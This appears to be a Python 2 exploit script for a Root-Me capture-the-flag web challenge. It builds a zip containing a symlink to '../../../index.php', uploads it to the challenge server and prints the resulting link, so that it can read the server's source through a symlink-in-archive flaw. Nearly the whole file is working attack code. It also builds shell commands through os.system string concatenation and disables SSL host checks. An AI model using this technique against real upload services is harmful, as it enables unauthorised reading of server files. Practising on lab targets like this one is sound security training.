#!/usr/bin/python

import io
import os
import re
import pycurl
import certifi
import StringIO
from urllib import urlencode


def clear(o):
    o.truncate(0)
    o.seek(0)

body_buffer = StringIO.StringIO()
header_buffer = StringIO.StringIO()


def perform_request(zipfile, target_filename, print_recv=False):
    c = pycurl.Curl()
    c.setopt(c.CAINFO, certifi.where())
    c.setopt(c.SSL_VERIFYHOST, 0)
    c.setopt(c.WRITEFUNCTION, body_buffer.write)
    c.setopt(c.HEADERFUNCTION, header_buffer.write)

    c.setopt(c.COOKIE, '')

    c.setopt(c.URL, 'http://challenge01.root-me.org/web-serveur/ch51/')
    c.setopt(c.HTTPPOST, [
        ('zipfile', (
            c.FORM_FILE, zipfile,
            c.FORM_FILENAME, target_filename,
            c.FORM_CONTENTTYPE, 'application/octet-stream',
        )),
    ])
    c.perform()

    body = body_buffer.getvalue()
    header = header_buffer.getvalue()

    if print_recv:
        print(body)
        print(header)

    clear(body_buffer)
    clear(header_buffer)

    return body.split("a href='")[1].split("'>here</a")[0]


def create_file_and_fill(filename, content):
    if not os.path.exists(os.path.dirname(filename)):
        try:
            os.makedirs(os.path.dirname(filename))
        except:
            print filename
            raise
    open(filename, "wb").write(content)

def make_zip(f_table, out_name):
    os.system("zip "+out_name+" --symlinks "+" ".join(f_table))

def create_sym(f, out):
    os.system("ln -s "+f+" "+out)
    return out

filenames = [create_sym("../../../index.php", "f")]
zipfile = "b.zip"
make_zip(filenames, zipfile)

print(perform_request("b.zip", "a.zip", True))
